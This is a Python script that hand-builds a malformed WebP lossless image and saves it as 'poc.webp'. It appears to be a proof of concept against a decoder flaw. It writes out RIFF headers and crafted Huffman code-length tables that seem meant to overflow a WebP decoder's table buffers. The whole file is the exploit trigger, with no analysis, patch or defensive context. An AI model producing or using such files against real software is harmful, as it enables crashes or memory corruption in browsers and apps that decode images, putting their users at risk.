from struct import pack


def bitstream_to_bytearray(bitstream: str) -> bytearray:
    # Pad the bitstream to make its length a multiple of 8
    while len(bitstream) % 8 != 0:
        bitstream += "0"

    # Convert bitstream to bytearray
    byte_array = bytearray()
    for i in range(0, len(bitstream), 8):
        byte_chunk = bitstream[i : i + 8][::-1]
        byte_value = int(byte_chunk, 2)
        byte_array.append(byte_value)

    return byte_array


def bit(val, len=-1):
    if len == -1:
        return bin(val)[2:][::-1]
    else:
        return bin(val)[2:].zfill(len)[::-1]


webp_chunk_size = 0
lossless_stream_size = 0

RIFF_header = b"RIFF"
RIFF_header += pack("I", webp_chunk_size)
RIFF_header += b"WEBPVP8L"
RIFF_header += pack("I", lossless_stream_size)

image_header = b"\x2f"
image_header += bitstream_to_bytearray("0" * 28 + "1000")

# 344 (6)
image_stream = bit(0) + bit(1) + bit(6, 4) + bit(0)
code_length_code_lengths = bit(0) + bit(15, 4)
tmp_list = [4 for i in range(19)]
tmp_list[0] = 0
tmp_list[2] = 0
tmp_list[8] = 0
for i in tmp_list:
    code_length_code_lengths += bit(i, 3)

code_length_green = bit(0)
code_length_green += (
    "0000" * 1
    + "1000" * 235
    + "1001" * 37
    + "1010"
    + "1011"
    + "1100"
    + "1101" * 64
    + "1110" * 4
)
code_length_red = bit(0)
code_length_red += (
    "0000"
    + "0001"
    + "1000" * 67
    + "1001" * 117
    + "1010"
    + "1011"
    + "1100"
    + "1101" * 65
    + "1110" * 2
)
code_length_dist = bit(0)
code_length_dist += "1000" + "1001" + "1010" + "1011" + "1100" + "1101" + "1110" * 34


image_stream += code_length_code_lengths + code_length_green
image_stream += code_length_code_lengths + code_length_red
image_stream += code_length_code_lengths + code_length_red
image_stream += code_length_code_lengths + code_length_red
image_stream += code_length_code_lengths + code_length_dist


image_stream = bitstream_to_bytearray(image_stream)
# image_stream += b"\xff" * 0xE


image = bytearray()
image.extend(RIFF_header)
image.extend(image_header)
image.extend(image_stream)

webp_chunk_size = len(image) - 8
lossless_stream_size = webp_chunk_size - 13

# edit image's size
image[4:8] = pack("I", webp_chunk_size)
image[16:20] = pack("I", lossless_stream_size)

print(image)
with open("poc.webp", "wb") as f:
    f.write(image)
